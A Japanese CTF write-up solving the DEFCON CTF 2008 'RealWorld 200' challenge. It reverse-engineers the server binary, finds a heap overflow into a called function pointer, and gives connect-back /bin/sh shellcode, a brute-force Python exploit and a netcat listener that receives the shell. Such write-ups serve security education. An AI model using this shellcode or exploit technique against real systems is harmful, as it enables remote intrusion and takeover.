@@ -1,0 +1,785 @@
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第○章: メモリアドレス推測と小さい領域への攻略コードの注入 ---
+
+著者：Kenji Aiko
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　世界規模で開催されるハッキングコンテスト「DEFCON Capture the Flag（以下
+CTF）」には、様々なセキュリティホールを利用してパスワードを取得するRemote
+ Exploiting系の問題があります。今回、その中からひとつ問題を選び、その回答
+方法を紹介します。
+
+　DEFCON Capture the Flag Web site
+　http://nopsr.us/
+
+
+■0x02.) 過去問題の入手
+
+　CTFで出題された問題は、CTFのWebサイトで入手できます。2008年の問題は以下
+から入手可能です。2007年以前の問題もTOPページからたどることができます。興
+味があれば、トライしてみてください。
+
+　DEFCON CTF 2008 問題
+　http://nopsr.us/ctf2008qual/
+
+　Webサイトを見ると分かる通り、このコンテストでは様々な分野の問題が出題さ
+れます。よって、勝ち抜くためには幅広いセキュリティの知識が必要となります。
+今回は、この中から小さなヒープ領域を利用したRemote Exploiting系の問題を攻
+略します。では、RealWorld 200の問題をダウンロードしてください。
+
+　DEFCON CTF 2008 RealWorld 200
+　http://nopsr.us/ctf2008qual/realworld200-be2241fd5ac13d18c2360046dba7ed0e
+
+
+■0x03.) IDAProで逆アセンブルコードを追う
+
+　まず、ダウンロードしたファイルが何のタイプのファイルであるかを調べます。
+
+-----  terminal
+# file realworld200-be2241fd5ac13d18c2360046dba7ed0e 
+realworld200-be2241fd5ac13d18c2360046dba7ed0e: ELF 32-bit LSB executable, Intel 
+80386, version 1 (FreeBSD), for FreeBSD 6.3, dynamically linked (uses shared 
+libs), FreeBSD-style, stripped
+#
+-----
+
+　fileコマンドにより、ELF実行ファイルであり、FreeBSDで動作することが分か
+りました。実行ファイルであるため、逆アセンブルして解析します。逆アセンブ
+ルにはIDAProを使用します。
+　IDAProは商用の逆アセンブラですが、古いバージョンである「version 4.9」が
+フリーウェアとして無償公開されています。商用版と比べると機能は制限されて
+いますが、十分に有用なレベルであるため、まずはこれをダウンロードします。
+
+　IDAPro フリーウェア版
+　http://www.hex-rays.com/idapro/idadownfreeware.htm
+
+　IDAProで実行ファイルを開いたら解析が行われ、逆アセンブルコードが表示さ
+れます。まずはどのような関数が呼び出されているかを調べるため「Ctrl + F12」
+で、関数コールの連結構造をグラフ化して表示します。すると、bind、listen、
+acceptといった、一般的なサーバが呼び出す関数をコールしています。
+　サーバの場合、大抵はacceptの後にforkで子供を作り、そっちにクライアント
+との処理を委譲するため、重要な部分はacceptからforkが呼び出されている一連
+の処理です。WinGraph32（Ctrl + F12で起動されたプログラム）の関数の呼び出
+し構造の結果から、08049144の関数がacceptとforkを呼び出していることが分か
+ります。では、その関数を解析します。
+
+-----  IDAPro（08049144）
+.text:08049144 status          = dword ptr -30h
+.text:08049144 var_2C          = dword ptr -2Ch
+.text:08049144 peer            = sockaddr ptr -28h
+.text:08049144 var_14          = dword ptr -14h
+.text:08049144 var_10          = dword ptr -10h
+.text:08049144 fildes          = dword ptr -0Ch
+.text:08049144 arg_0           = dword ptr  8
+.text:08049144 arg_4           = dword ptr  0Ch
+.text:08049144
+.text:08049144                 push    ebp
+.text:08049145                 mov     ebp, esp
+.text:08049147                 sub     esp, 38h
+.text:0804914A                 mov     [ebp+var_2C], 1
+.text:08049151                 mov     [ebp+status], 0
+.text:08049158
+.text:08049158                 cmp     [ebp+var_2C], 0
+.text:0804915C                 jz      short locret_80491CF
+.text:0804915E                 sub     esp, 4
+.text:08049161                 lea     eax, [ebp+var_10]
+.text:08049164                 push    eax             ; int *
+.text:08049165                 lea     eax, [ebp+peer]
+.text:08049168                 push    eax             ; peer
+.text:08049169                 push    [ebp+arg_0]     ; int
+.text:0804916C                 call    _accept
+.text:08049171                 add     esp, 10h
+.text:08049174                 mov     [ebp+fildes], eax
+.text:08049177                 cmp     [ebp+fildes], 0FFFFFFFFh
+.text:0804917B                 jnz     short loc_804917F
+.text:0804917D                 jmp     short loc_8049158
+.text:0804917F                 call    _fork
+.text:08049184                 mov     [ebp+var_14], eax
+.text:08049187                 cmp     [ebp+var_14], 0FFFFFFFFh
+.text:0804918B                 jnz     short loc_804918F
+.text:0804918D                 jmp     short loc_8049158
+.text:0804918F                 cmp     [ebp+var_14], 0
+.text:08049193                 jnz     short loc_80491BF
+.text:08049195                 sub     esp, 0Ch
+.text:08049198                 push    [ebp+fildes]
+.text:0804919B                 mov     eax, [ebp+arg_4]
+.text:0804919E                 call    eax
+.text:080491A0                 add     esp, 10h
+.text:080491A3                 mov     [ebp+status], eax
+.text:080491A6                 sub     esp, 0Ch
+.text:080491A9                 push    [ebp+fildes]    ; fildes
+.text:080491AC                 call    _close
+.text:080491B1                 add     esp, 10h
+.text:080491B4                 sub     esp, 0Ch
+.text:080491B7                 push    [ebp+status]    ; status
+.text:080491BA                 call    _exit
+-----
+
+　forkが呼び出され、プロセスが新たに生成されたところで、「エラー処理」「
+親の処理」「子の処理」の3つに処理が分岐しているのが分かります。エラー処理
+と親の処理は関係ないため、子の処理を追います。すると、0804919Eで「call eax」
+を実行しています。そのひとつ前のmov命令で、eaxに引数の値を入れているため、
+この関数に渡される引数の場所へジャンプすることが分かります。では、もう一度
+WinGraph32を見て、関数08049144を呼び出している関数を確認します。
+　すると関数08048D44が、関数08049144を呼び出しています。
+
+-----  IDAPro（08048D44）
+.text:08048D44 var_4           = dword ptr -4
+.text:08048D44
+.text:08048D44                 push    ebp
+.text:08048D45                 mov     ebp, esp
+.text:08048D47                 sub     esp, 8
+.text:08048D4A                 and     esp, 0FFFFFFF0h
+.text:08048D4D                 mov     eax, 0
+.text:08048D52                 add     eax, 0Fh
+.text:08048D55                 add     eax, 0Fh
+.text:08048D58                 shr     eax, 4
+.text:08048D5B                 shl     eax, 4
+.text:08048D5E                 sub     esp, eax
+.text:08048D60                 mov     [ebp+var_4], 0
+.text:08048D67                 sub     esp, 0Ch
+.text:08048D6A                 push    0D10h
+.text:08048D6F                 call    sub_8048FBC
+.text:08048D74                 add     esp, 10h
+.text:08048D77                 mov     [ebp+var_4], eax
+.text:08048D7A                 sub     esp, 8
+.text:08048D7D                 push    offset sub_8048CE0
+.text:08048D82                 push    [ebp+var_4]
+.text:08048D85                 call    sub_8049144
+.text:08048D8A                 add     esp, 10h
+.text:08048D8D                 mov     eax, 0
+.text:08048D92                 leave
+.text:08048D93                 retn
+-----
+
+　アドレス08048D85で関数08049144を呼び出していますが、呼び出し前に08048C
+E0をスタックへ格納しています。よって、08048CE0以降が、fork後にeaxに格納さ
+れ呼び出される関数となります。では、eaxに格納されcallされる関数を追います。
+ここからが本番です。
+
+-----  IDAPro（08048CE0）
+.text:08048CE0
+.text:08048CE0 var_4           = dword ptr -4
+.text:08048CE0 fildes          = dword ptr  8
+.text:08048CE0
+.text:08048CE0                 push    ebp
+.text:08048CE1                 mov     ebp, esp
+.text:08048CE3                 sub     esp, 8
+.text:08048CE6                 mov     [ebp+var_4], 0
+.text:08048CED                 call    sub_8048BE0
+.text:08048CF2                 sub     esp, 8
+.text:08048CF5                 push    44h             ; size
+.text:08048CF7                 push    1               ; nmemb
+.text:08048CF9                 call    _calloc
+.text:08048CFE                 add     esp, 10h
+.text:08048D01                 mov     [ebp+var_4], eax
+.text:08048D04                 push    0Ah             ; int
+.text:08048D06                 push    44h             ; int
+.text:08048D08                 push    [ebp+var_4]     ; int
+.text:08048D0B                 push    [ebp+fildes]    ; fildes
+.text:08048D0E                 call    sub_8048E24
+.text:08048D13                 add     esp, 10h
+.text:08048D16                 push    0Ah             ; int
+.text:08048D18                 push    44h             ; int
+.text:08048D1A                 mov     eax, [ebp+var_4]
+.text:08048D1D                 add     eax, 20h
+.text:08048D20                 push    eax             ; int
+.text:08048D21                 push    [ebp+fildes]    ; fildes
+.text:08048D24                 call    sub_8048E24
+.text:08048D29                 add     esp, 10h
+.text:08048D2C                 mov     eax, [ebp+var_4]
+.text:08048D2F                 cmp     dword ptr [eax+40h], 0
+.text:08048D33                 jz      short loc_8048D3D
+.text:08048D35                 mov     eax, [ebp+var_4]
+.text:08048D38                 mov     eax, [eax+40h]
+.text:08048D3B                 call    eax
+.text:08048D3D
+.text:08048D3D                 mov     eax, 0
+.text:08048D42                 leave
+.text:08048D43                 retn
+-----
+　
+　08048CEDにて、「call sub_8048BE0」が呼び出されます。また、08048D0Eと08
+048D24にて、「call sub_8048E24」が呼び出されます。
+　では、読みやすいようにC言語のコードに変換します。
+
+-----  手動デコンパイル（8048CE0）
+int sub_8048CE0(int fd)
+{
+        unsigned char *p = 0;
+        
+        sub_8048BE0();
+        
+        p = calloc(1, 0x44);
+        
+        sub_8048E24(fd, p, 0x44, 0x0A);
+        sub_8048E24(fd, p + 0x20, 0x44, 0x0A);
+        
+        if(*((unsigned long)(p + 0x40)) != 0){
+                void (*po)() = *((unsigned long)(p + 0x40));
+                po();
+        }
+
+        return 0;
+}
+-----
+
+　同じく、呼び出されている2つの関数も逆アセンブルして、C言語にデコンパイ
+ルします。
+
+-----  IDAPro（08048BE0）
+.text:08048BE0
+.text:08048BE0 var_18          = dword ptr -18h
+.text:08048BE0 buf             = dword ptr -14h
+.text:08048BE0 var_10          = dword ptr -10h
+.text:08048BE0 var_C           = dword ptr -0Ch
+.text:08048BE0 var_8           = dword ptr -8
+.text:08048BE0 fildes          = dword ptr -4
+.text:08048BE0
+.text:08048BE0                 push    ebp
+.text:08048BE1                 mov     ebp, esp
+.text:08048BE3                 sub     esp, 18h
+.text:08048BE6                 mov     [ebp+fildes], 0
+.text:08048BED                 mov     [ebp+var_8], 0
+.text:08048BF4                 mov     [ebp+var_C], 0
+.text:08048BFB                 mov     [ebp+var_10], 0
+.text:08048C02                 mov     [ebp+buf], 0
+.text:08048C09                 sub     esp, 8
+.text:08048C0C                 push    0               ; int
+.text:08048C0E                 push    offset aDevUrandom ; "/dev/urandom"
+.text:08048C13                 call    _open
+.text:08048C18                 add     esp, 10h
+.text:08048C1B                 mov     [ebp+fildes], eax
+.text:08048C1E                 cmp     [ebp+fildes], 0FFFFFFFFh
+.text:08048C22                 jnz     short loc_8048C40
+.text:08048C24                 sub     esp, 0Ch
+.text:08048C27                 push    offset aOpenDevUrandom ; "open /dev/urandom failed!\n"
+.text:08048C2C                 call    _perror
+.text:08048C31                 add     esp, 10h
+.text:08048C34                 mov     [ebp+var_18], 0FFFFFFFFh
+.text:08048C3B                 jmp     loc_8048CDA
+.text:08048C40
+.text:08048C40                 sub     esp, 4
+.text:08048C43                 push    4               ; nbyte
+.text:08048C45                 lea     eax, [ebp+buf]
+.text:08048C48                 push    eax             ; buf
+.text:08048C49                 push    [ebp+fildes]    ; fildes
+.text:08048C4C                 call    _read
+.text:08048C51                 add     esp, 10h
+.text:08048C54                 cmp     eax, 4
+.text:08048C57                 jz      short loc_8048C72
+.text:08048C59                 sub     esp, 0Ch
+.text:08048C5C                 push    offset aReadDevUrandom ; "read /dev/urandom failed!\n"
+.text:08048C61                 call    _perror
+.text:08048C66                 add     esp, 10h
+.text:08048C69                 mov     [ebp+var_18], 0FFFFFFFFh
+.text:08048C70                 jmp     short loc_8048CDA
+.text:08048C72
+.text:08048C72                 mov     eax, [ebp+buf]
+.text:08048C75                 and     eax, 3FFh
+.text:08048C7A                 mov     [ebp+var_C], eax
+.text:08048C7D                 mov     [ebp+var_8], 0
+.text:08048C84
+.text:08048C84                 cmp     [ebp+var_8], 3FFh
+.text:08048C8B                 jg      short loc_8048CBF
+.text:08048C8D                 mov     eax, [ebp+var_8]
+.text:08048C90                 cmp     eax, [ebp+var_C]
+.text:08048C93                 jnz     short loc_8048CA9
+.text:08048C95                 sub     esp, 8
+.text:08048C98                 push    44h             ; size
+.text:08048C9A                 push    1               ; nmemb
+.text:08048C9C                 call    _calloc
+.text:08048CA1                 add     esp, 10h
+.text:08048CA4                 mov     [ebp+var_10], eax
+.text:08048CA7                 jmp     short loc_8048CB8
+.text:08048CA9
+.text:08048CA9                 sub     esp, 8
+.text:08048CAC                 push    44h             ; size
+.text:08048CAE                 push    1               ; nmemb
+.text:08048CB0                 call    _calloc
+.text:08048CB5                 add     esp, 10h
+.text:08048CB8
+.text:08048CB8                 lea     eax, [ebp+var_8]
+.text:08048CBB                 inc     dword ptr [eax]
+.text:08048CBD                 jmp     short loc_8048C84
+.text:08048CBF
+.text:08048CBF                 cmp     [ebp+var_10], 0
+.text:08048CC3                 jz      short loc_8048CD3
+.text:08048CC5                 sub     esp, 0Ch
+.text:08048CC8                 push    [ebp+var_10]    ; void *
+.text:08048CCB                 call    _free
+.text:08048CD0                 add     esp, 10h
+.text:08048CD3
+.text:08048CD3                 mov     [ebp+var_18], 0
+.text:08048CDA
+.text:08048CDA                 mov     eax, [ebp+var_18]
+.text:08048CDD                 leave
+.text:08048CDE                 retn
+.text:08048CDE sub_8048BE0     endp
+-----
+
+-----  手動デコンパイル（8048BE0）
+int sub_8048BE0(void)
+{
+        int rd, i;
+        unsigned long num;
+        unsigned char *p = NULL;
+        
+        rd = open("/dev/urandom", 0);
+        if(rd == -1){
+                perror("open /dev/urandom failed!\n");
+                return -1;
+        }
+        
+        if(read(fd, &num, 4) != 4){
+                perror("read /dev/urandom failed!\n");
+                return -1;
+        }
+        
+        num &= 0x000003FF;
+        
+        for(i=0; i <= 0x000003FF; i++){
+                if(i == num)
+                        p = calloc(1, 0x44);
+                else
+                        calloc(1, 0x44);
+        }
+        
+        if(p != NULL)
+                free(p);
+        
+        return 0;
+}
+-----
+
+　続いて08048E24です。
+
+-----  IDAPro（08048E24）
+.text:08048E24
+.text:08048E24 var_14          = dword ptr -14h
+.text:08048E24 var_10          = dword ptr -10h
+.text:08048E24 var_C           = dword ptr -0Ch
+.text:08048E24 var_8           = dword ptr -8
+.text:08048E24 var_2           = byte ptr  -2
+.text:08048E24 var_1           = byte ptr  -1
+.text:08048E24 fildes          = dword ptr  8
+.text:08048E24 arg_4           = dword ptr  0Ch
+.text:08048E24 arg_8           = dword ptr  10h
+.text:08048E24 arg_C           = dword ptr  14h
+.text:08048E24
+.text:08048E24                 push    ebp
+.text:08048E25                 mov     ebp, esp
+.text:08048E27                 sub     esp, 18h
+.text:08048E2A                 mov     eax, [ebp+arg_C]
+.text:08048E2D                 mov     [ebp+var_1], al
+.text:08048E30                 mov     eax, [ebp+arg_4]
+.text:08048E33                 mov     [ebp+var_8], eax
+.text:08048E36                 mov     [ebp+var_C], 0
+.text:08048E3D                 mov     [ebp+var_10], 0
+.text:08048E44
+.text:08048E44                 sub     esp, 4
+.text:08048E47                 push    1               ; nbyte
+.text:08048E49                 lea     eax, [ebp-2]
+.text:08048E4C                 push    eax             ; buf
+.text:08048E4D                 push    [ebp+fildes]    ; fildes
+.text:08048E50                 call    _read
+.text:08048E55                 add     esp, 10h
+.text:08048E58                 mov     [ebp+var_C], eax
+.text:08048E5B                 cmp     [ebp+var_C], 0
+.text:08048E5F                 jg      short loc_8048E6A
+.text:08048E61                 mov     [ebp+var_14], 0FFFFFFFFh
+.text:08048E68                 jmp     short loc_8048EA3
+.text:08048E6A
+.text:08048E6A                 movzx   edx, [ebp+var_2]
+.text:08048E6E                 movsx   eax, [ebp+var_1]
+.text:08048E72                 cmp     edx, eax
+.text:08048E74                 jnz     short loc_8048E7E
+.text:08048E76                 mov     eax, [ebp+var_10]
+.text:08048E79                 mov     [ebp+var_14], eax
+.text:08048E7C                 jmp     short loc_8048EA3
+.text:08048E7E
+.text:08048E7E                 mov     eax, [ebp+var_10]
+.text:08048E81                 cmp     eax, [ebp+arg_8]
+.text:08048E84                 jl      short loc_8048E8F
+.text:08048E86                 mov     [ebp+var_14], 0FFFFFFFFh
+.text:08048E8D                 jmp     short loc_8048EA3
+.text:08048E8F
+.text:08048E8F                 mov     eax, [ebp+var_10]
+.text:08048E92                 mov     edx, eax
+.text:08048E94                 add     edx, [ebp+var_8]
+.text:08048E97                 mov     al, [ebp+var_2]
+.text:08048E9A                 mov     [edx], al
+.text:08048E9C                 lea     eax, [ebp+var_10]
+.text:08048E9F                 inc     dword ptr [eax]
+.text:08048EA1                 jmp     short loc_8048E44
+.text:08048EA3
+.text:08048EA3                 mov     eax, [ebp+var_14]
+.text:08048EA6                 leave
+.text:08048EA7                 retn
+-----
+
+-----  手動デコンパイル（8048E24）
+int sub_8048E24(int fd, unsigned char *buff, int size, int crlf)
+{
+        int s = 0;
+        char lf, c;
+        
+        lf = (char)(ctlf & 0xFF);
+        
+        while(1){
+                int ret = read(fd, &c, 1);
+                if(ret == 0)
+                        return -1;
+                if(c == lf)
+                        return s;
+                if(s >= size)
+                        return -1;
+                *(buff + s) = (unsigned char)c & 0xFF;
+                s++;
+        }
+        
+        return 0;
+}
+-----
+
+　行き当たりばったりの手動デコンパイルなので、少々コードが汚い（かつ間違
+いがありそう）ですが、動作原理を知る上はおそらく問題ないと思います。本来
+ならば逆アセンブルされたコードを読みながら脆弱な部分を探すことになります
+が、今回は分かりやすくC言語に書き直しました。このコードを見て、どういった
+仕組みになっているかを解析します。
+　まず、sub_8048CE0から最初に呼び出されているsub_8048BE0ですが、これは、
+何をしている関数でしょうか？　実はこれは、callocで確保した領域のアドレス
+をランダムな値にするための処理です。0x0400回だけcallocを呼び出しており、
+その中からランダムでひとつだけ選び、freeで解放します。その状態で関数を終
+了させ、呼び出し元のsub_8048CE0へ戻ると、戻った先では、再度callocが呼び出
+されます。このとき、sub_8048BE0内でランダム値によって選ばれ、freeで解放さ
+れた場所が、再度メモリ領域として割り当てられます。つまり、結果的に、0x04
+00パターンのアドレス値の中からランダムに選ばれたメモリ領域が、sub_8048E2
+4も含めた以降の処理で使われます。
+　では、sub_8048E24は何をやっている関数かというと、これは引数に「ファイル
+ハンドル」「保存バッファ」「最大サイズ」「終端文字」の4つを渡し、ファイル
+ハンドルから、「最大サイズになるか」あるいは「終端文字が見つかる」まで、
+保存バッファへデータを書き出す処理を行います。
+　これらを踏まえて、もう一度sub_8048CE0の処理と問題部分を考えます。まず、
+ランダムなアドレスではありますが、callocでメモリが0x44バイト確保され、そ
+の0x44バイトの領域に「終端文字'¥n'が見つかるまで」クライアントから送られ
+たデータをコピーします。次に再度、今度はcallocで確保された先頭メモリアド
+レス+0x20から、同じく「終端文字'¥n'が見つかるまで」クライアントから送られ
+たデータをコピーします。ちなみに、ここで0x44バイトしか確保していない領域
+に対して、+0x20の場所から0x44バイト（つまり0x64バイト）データをコピーして
+いるため、ヒープオーバーフローが発生しています。そして、最後に、+0x40から
+の4バイト値へcall命令によりジャンプしているため、ここで、任意のコードを実
+行させるためのジャンプ先アドレスを指定できます。
+　これらをまとめると、以下のメモリマップになります。
+
+  <------------- calloc -------------->
+  +----| |------+----------------+----------------+----------------+----+
+  |    | |      |                |ADDR            |                |    |
+  +----| |------+----------------+----------------+----------------+----+
+ 0x00          0x30             0x40             0x50             0x60 0x64
+
+　さて、ADDRにはshellcodeへのアドレスを入れる必要があるため、実質、0x40バ
+イトしか自由に書き換えできるメモリ領域はありません。つまり、0x40バイト以
+下のリモート用shellcodeを用意する必要があります。もしくは、ADDRの前にjmp
+命令を置き、ADDR分（4バイト）を飛ばすことで、最大0x64（ADDRとjmpを省くと
+0x5E）分、shellcode用に使用できます。
+　つまり、第一の問題は、0x40もしくは0x64バイトに収まるリモート用のshellc
+odeを用意する必要があるということ、そして第二の問題は、この領域がcallocに
+よってランダムに決定された領域であるため、アドレスを決め打ちできないとい
+うこと、この2つが解決すべき壁となります。ちなみに解決策は1つではありませ
+ん。解く方法はいくつもありますので、自分で考えてみるのもよいでしょう。
+
+
+■0x04.) アドレス推測とshellcodeの作成
+
+　callocによりランダムに決定される領域のアドレスを100%当てるのは不可能で
+すが、この問題は、callocを0x0400回呼び出して、その中からひとつランダムに
+選んでいるため、0x0400回（1024回）試行すれば、確率的には1回は当たります。
+つまり、exploitをブルートフォース的に投げていけば、それなりの確率でヒット
+します。
+　calloc関数をフックして、アドレスの候補を列挙します。
+
+-----  calloc_hook.c
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stdlib.h>
+#include <stdio.h>
+ 
+static void * (*calloc0)(size_t nmemb, size_t size);
+ 
+void __attribute__((constructor))
+init_calloc0()
+{
+        calloc0 = dlsym(RTLD_NEXT, "calloc");
+}
+ 
+void * calloc(size_t nmemb, size_t size)
+{
+        void *p = (*calloc0)(nmemb, size);
+        fprintf(stderr, "%08X\n", (unsigned long)p);
+        return p;
+}
+-----
+
+　calloc関数をフックした状態で、プログラムを実行します。
+
+-----  freebsd terminal
+# gcc -shared -fPIC -o calloc_hook.so calloc_hook.c -dl
+# setenv LD_PRELOAD ./calloc_hook.so
+# chmod 755 realworld200-be2241fd5ac13d18c2360046dba7ed0e
+# ./realworld200-be2241fd5ac13d18c2360046dba7ed0e
+-----
+
+　実行するとポート3344で接続待ち状態になるので、別のマシンからconnectしま
+す。
+
+-----  attack terminal
+# nc 10.81.45.21 3344
+-----
+
+　connectすると、calloc関数が1024回呼び出されます。そして、関数フックによ
+り、callocの戻り値が出力されます。
+
+-----  freebsd terminal
+# ./realworld200-be2241fd5ac13d18c2360046dba7ed0e
+0804C000
+0804C080
+0804C100
+0804C180
+.....
+......
+0806BE80
+0806BF00
+0806BF80
+08053800
+-----
+
+　この中から好きなアドレスを選び、決め打ちします。決め打ちにしたとしても、
+1024回試行すれば、1回は成功する確率なので、ここはブルートフォースで攻略し
+ます。
+
+　次にshellcodeの問題ですが、今回はサイズが膨大にあるわけではないため、そ
+の点を若干考慮して作成します。
+
+-----  shellcode.s
+.globl main
+
+main:
+        push       $0x61
+        pop        %eax
+        cdq
+        push       %edx
+        inc        %edx
+        push       %edx
+        inc        %edx
+        push       %edx
+        push       $0x152D5156
+        int        $0x80
+        push       $0x611E0210
+        mov        %esp, %ecx
+        push       $0x10
+        push       %ecx
+        push       %eax
+        push       %ecx
+        xchg       %edi, %eax
+        push       $0x62
+        pop        %eax
+        int        $0x80
+L1:     mov        $0x5A, %al
+        push       %edx
+        push       %edi
+        push       %edx
+        int        $0x80
+        dec        %edx
+        jns        L1
+        push       $0x0068732F
+        push       $0x6E69622F
+        mov        %esp, %ebx
+        push       %eax
+        push       %esp
+        push       %ebx
+        push       %ebx
+        mov        $0x3B, %al
+        int        $0x80
+        .string "ADDR"
+-----
+
+　アセンブラで書いて、マシン語に変換します。
+
+-----  freebsd terminal
+# gcc shellcode.s -o shellcode
+# objdump -d shellcode | grep \<main\> -A 42
+
+080483c4 <main>:
+ 80483c4:        6a 61                        push   $0x61
+ 80483c6:        58                           pop    %eax
+ 80483c7:        99                           cltd   
+ 80483c8:        52                           push   %edx
+ 80483c9:        42                           inc    %edx
+ 80483ca:        52                           push   %edx
+ 80483cb:        42                           inc    %edx
+ 80483cc:        52                           push   %edx
+ 80483cd:        68 56 51 2d 15               push   $0x152d5156
+ 80483d2:        cd 80                        int    $0x80
+ 80483d4:        68 10 02 1e 61               push   $0x611e0210
+ 80483d9:        89 e1                        mov    %esp,%ecx
+ 80483db:        6a 10                        push   $0x10
+ 80483dd:        51                           push   %ecx
+ 80483de:        50                           push   %eax
+ 80483df:        51                           push   %ecx
+ 80483e0:        97                           xchg   %eax,%edi
+ 80483e1:        6a 62                        push   $0x62
+ 80483e3:        58                           pop    %eax
+ 80483e4:        cd 80                        int    $0x80
+
+080483e6 <L1>:
+ 80483e6:        b0 5a                        mov    $0x5a,%al
+ 80483e8:        52                           push   %edx
+ 80483e9:        57                           push   %edi
+ 80483ea:        52                           push   %edx
+ 80483eb:        cd 80                        int    $0x80
+ 80483ed:        4a                           dec    %edx
+ 80483ee:        79 f6                        jns    80483e6 <L1>
+ 80483f0:        68 2f 73 68 00               push   $0x68732f
+ 80483f5:        68 2f 62 69 6e               push   $0x6e69622f
+ 80483fa:        89 e3                        mov    %esp,%ebx
+ 80483fc:        50                           push   %eax
+ 80483fd:        54                           push   %esp
+ 80483fe:        53                           push   %ebx
+ 80483ff:        53                           push   %ebx
+ 8048400:        b0 3b                        mov    $0x3b,%al
+ 8048402:        cd 80                        int    $0x80
+ 8048404:        41                           inc    %ecx
+ 8048405:        44                           inc    %esp
+ 8048406:        44                           inc    %esp
+ 8048407:        52                           push   %edx
+-----
+
+　shellcodeを元にexploitを作成します。
+
+-----  exploit200.py
+#!/usr/bin/python
+from socket import *
+
+if __name__ == "__main__":
+
+        for i in range(100):
+
+                s = socket()
+                s.connect(('10.81.45.21', 3344))
+
+                shellcode = "¥x6a¥x61¥x58¥x99¥x52¥x42¥x52¥x42¥x52¥x68"
+                shellcode += "¥x56¥x51¥x2d¥x15" ## REMOTE ADDR
+                shellcode += "¥xcd¥x80¥x68"
+                shellcode += "¥x10¥x02¥x1e¥x61" ## REMOTE PORT
+                shellcode += "¥x89¥xe1¥x6a¥x10¥x51¥x50¥x51¥x97"
+                shellcode += "¥x6a¥x62¥x58"
+
+                s.send(shellcode + '¥n')
+
+                shellcode = "¥xcd¥x80¥xb0¥x5a¥x52"
+                shellcode += "¥x57¥x52¥xcd¥x80¥x4a¥x79¥xf6"
+                shellcode += "¥x68¥x2f¥x73¥x68¥x00¥x68¥x2f¥x62"
+                shellcode += "¥x69¥x6e¥x89¥xe3¥x50¥x54¥x53¥x53"
+                shellcode += "¥xb0¥x3b¥xcd¥x80"
+                shellcode += "¥x80¥xbb¥x06¥x08" ## RET ADDRESS
+
+                s.send(shellcode + '¥n')
+                s.close
+-----
+
+　今回作成したshellcodeは、socketを開き、connect関数を呼び出して任意のサ
+ーバへコネクションを行うものです。「REMOTE ADDR」の4バイトにサーバのIPア
+ドレスを、同じく「REMOTE PORT」の下位2バイトにサーバのポートを指定します。
+そして「RET ADDRESS」には、推測したメモリアドレス（callocの戻り値）を設定
+します。
+　リモート環境を対象としたアタックでは、bind、listen、acceptを行い、外部
+から接続を待ち受ける「bind型」のshellcodeも良く使われますが、今回はshell
+codeを置けるメモリ領域が少なかったため（0x40バイト）このようなshellcodeに
+しました。よって、こちら側で待ち受け用のサーバも用意します。待ち受け用の
+サーバには、netcatを使います。
+
+-----  attack terminal
+# nc -l 7777
+-----
+
+　続いて、ターゲットとなるマシンで、realworld200プログラムを起動します。
+
+-----  target terminal
+# ./realworld200-be2241fd5ac13d18c2360046dba7ed0e
+-----
+
+　そして、ターゲットマシンのポート3344（realworld200プログラムが利用する
+ポート）へ、exploitを送信します。
+
+-----  attack terminal
+# python exploit200.py
+-----
+
+　あとは確率の問題ですが、アドレスがcallocで得られるアドレス範囲にマッチ
+していれば、300〜400回で（要するにexploit200.pyを3〜4回実行すれば）攻撃は
+成功します。攻撃が成功したら、netcatから、targetマシンが奪えます。
+
+-----  attack terminal
+# nc -l 7777
+ls（コマンドが通る）
+.cshrc
+.login
+.login_conf
+.mail_aliases
+.mailrc
+.profile
+.rhosts
+.shrc
+realworld200-be2241.core
+realworld200-be2241fd5ac13d18c2360046dba7ed0e
+key（パスワード発見！）
+-----
+
+　以上で攻略完了です。いかがだったでしょうか？　この問題の特徴は、乱数を
+用いてアドレスを推測できないようにしている点、そして、微妙に小さい（が、
+shellcodeが埋め込められないレベルでは決してない程度の）メモリ領域、の2点
+がなかなか面白いところだったと思います。
+
+
+■0x05.) 別の攻撃方法
+
+　この問題には、模範解答がありません。考えればまだまだ様々な方法が見つけ
+られると思います。例えば、今回は0x40バイトに無理矢理shellcodeを押し込みま
+したが、jmp命令を使って「RET ADDRESS」を飛ばすようにすれば、もう少し多く
+のメモリ領域をshellcode置き場として使用できます。さらに、shellcode内でも
+う一度、広いアドレス領域を指定してsub_08048E24関数を呼び出せば、攻撃者の
+思いのままのサイズのshellcode用領域が用意できます。なにせこの問題プログラ
+ムの内部には、1023×0x44バイトの何も使っていない領域があるわけですから。
+　また、この問題に興味があれば、DEFCON CTF 2008年の「Potent Pwnables 200」
+の問題を解いてみるのもよいと思います。
+
+
+■0x06.) さいごに
+
+　今回はハッキングコンテスト「DEFCON CTF 2008」の問題解説をやりましたが、
+いかがだったでしょうか？　この大会は毎年6月上旬ごろに予選が行われており、
+その予選に勝ち残った（約）7組が決勝戦をラスベガスで行い、TOPを決めます。
+世界中のセキュリティエンジニアが参加していますので、やはりレベルは高いで
+すし、純粋なセキュリティの問題だけではなく、パズル的なものや数学的なもの
+まで幅広い問題があります。予選はリモートで、Webでアカウント登録するだけで
+参加できるので、もし興味があれば、来年2009年のCTFに挑戦してみても楽しいか
+もしれません。
+　また、日本でも有志を集めて「CTF勉強会」（http://ja.avtokyo.org/projects）
+というイベントを月1回開催しています。こちらも興味があれば参加してみてはど
+うでしょうか。
+
+　さて、そんなところで、今年も残りわずかとなりました。今年は個人的には怒
+濤のような1年でしたが、振り返ってみると楽しい思い出です。来年も、振り返っ
+てみて楽しかったなと思える1年にしたいと思います。では、また来年お会いしま
+しょう。
+
+
+
